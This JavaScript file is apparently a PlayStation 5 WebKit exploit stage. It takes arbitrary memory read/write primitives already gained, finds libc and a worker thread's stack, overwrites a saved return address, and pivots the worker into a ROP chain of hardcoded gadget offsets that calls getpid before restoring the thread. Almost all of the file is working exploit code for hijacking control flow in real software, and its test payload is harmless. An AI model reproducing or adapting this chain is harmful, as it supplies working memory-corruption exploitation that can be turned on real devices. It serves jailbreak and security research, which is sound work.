// worker_hijack_1340.js — Phase 2a: worker-thread ROP boot test (getpid).
// NO pivot/save gadgets. Model: Bagagwa main.js launch_chain + rop.js worker_rop,
// old RVAs only (pop rsp 0xA1138, setjmp 0x5D990/longjmp 0x5D9E0, stubs).
// Worst case: worker thread dies (tab warning), main thread + kernel untouched.
(async () => {
  const say = async (s) => { try { await log("[whij] " + s); } catch(e){} };
  const hx = (v) => { try { return "0x" + (BigInt(v) & 0xFFFFFFFFFFFFFFFFn).toString(16); } catch(e){ return "?"; } };
  const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
  const WK = BigInt(PS5.webkitBase||0), LK = BigInt(PS5.libkernelBase||0);
  const G = {poprdi:0x288B2n,poprsi:0x1EE7An,poprdx:0xFA7A2n,poprcx:0x80597n,poprax:0x3C98En,poprsp:0xA1138n,popr8:0x8CE7Cn,popr9:0x80596n,movrdi_rax:0x3881Fn,movrdi_rsi:0xC05B6n,ret:0xC7n};
  const ST = {getpid:0x1B860n};
  const POISON = 0x00C0FFEDEADBEEFn;

  // --- discover (compact): libc, worker, stack, retfp ---
  let LC = 0n;
  for(const [slot,rva] of [[0x334E098,0x5D9E0],[0x334F680,0x5D9E0],[0x334F6A8,0x5D990],[0x3350850,0x14700]]){
    try{ const c=(read64(WK+BigInt(slot))-BigInt(rva))&0xFFFFFFFFFFFFn;
      if(c>0x800000000n&&c<0x900000000n&&c%0x4000n===0n){LC=c;break;} }catch(e){}
  }
  if(!LC){ await say("ABORT no libc"); return; }
  const SETJMP = LC+0x5D990n, LONGJMP = LC+0x5D9E0n;
  let worker = null;
  try{
    worker = new Worker("payloads/worker_slave.js");
    await Promise.race([new Promise((res)=>{worker.onmessage=()=>res(1);worker.postMessage(0);}),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("t/o")),5000))]);
  }catch(e){ await say("ABORT worker handshake"); return; }
  let wstack = 0n;
  for(const h of [0x64218,0x6C218]){
    try{ let t=read64(LK+BigInt(h));
      for(let i=0;i<64&&t!==0n;i++){ if(read64(t+0xB0n)===0x80000n){ wstack=read64(t+0xA8n); break; } t=read64(t+0x38n); }
    }catch(e){}
    if(wstack) break;
  }
  if(!wstack){ await say("ABORT no wstack"); return; }
  const EXP = LK+0x1FD01n;
  let retslot = 0n, cnt = 0;
  try{ for(let o=0x7F000n;o<0x80000n;o+=8n){ if(read64(wstack+o)===EXP){ cnt++; if(!retslot) retslot=wstack+o; } } }catch(e){}
  if(cnt!==1n && cnt!==1){ await say("ABORT retfp count="+cnt); return; }
  await say("disc libc="+hx(LC)+" ws="+hx(wstack)+" ret="+hx(retslot));

  // --- build chain: [setjmp][getpid->retval][restore+jmpbuf patch][longjmp] ---
  const ctx = malloc(0x40), retval = malloc(8), cbase = malloc(0x1000);
  const entry = cbase+0x100n;
  write64(retval, POISON);
  const Q = [];
  const push = (v) => Q.push(BigInt(v));
  push(WK+G.poprdi); push(ctx); push(SETJMP);            // pre_chain
  if((entry+BigInt(Q.length*8))&8n) push(WK+G.ret);      // align
  push(LK+ST.getpid);                                    // getpid()
  push(WK+G.poprdi); push(retval); push(WK+G.movrdi_rax);// store rax
  const orig_ret = read64(retslot), orig_sp = read64(retslot+8n);
  push(WK+G.poprdi); push(ctx); push(WK+G.poprsi); push(orig_ret); push(WK+G.movrdi_rsi);       // ctx[0]=orig_ret
  push(WK+G.poprdi); push(ctx+0x10n); push(WK+G.poprsi); push(retslot); push(WK+G.movrdi_rsi);  // ctx[0x10]=retptr
  push(WK+G.poprdi); push(retslot+8n); push(WK+G.poprsi); push(orig_sp); push(WK+G.movrdi_rsi);// restore sp slot
  push(WK+G.poprdi); push(ctx); push(LONGJMP);            // resume worker
  for(let i=0;i<Q.length;i++) write64(entry+BigInt(i*8), Q[i]);
  await say("chain "+Q.length+"q entry="+hx(entry)+" orig_ret="+hx(orig_ret));

  // --- hijack + fire ---
  write64(retslot, WK+G.poprsp);
  write64(retslot+8n, entry);
  let answered = false;
  try{
    await Promise.race([new Promise((res)=>{worker.onmessage=()=>{answered=true;res(1);};worker.postMessage(0);}),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("t/o")),10000))]);
  }catch(e){ await say("fire TIMEOUT answered="+answered); }
  await sleep(300);
  let got = 0n;
  try{ got = read64(retval); }catch(e){}
  try{ write64(retslot, orig_ret); write64(retslot+8n, orig_sp); }catch(e){}
  await say("retval="+hx(got)+" "+(got===POISON?"CHAIN DID NOT RUN (poison intact)":(got!==0n?"GETPID OK via worker ROP pid="+got:"got 0 (suspicious)")));
  try{ send_notification("whij done"); }catch(e){}
})();
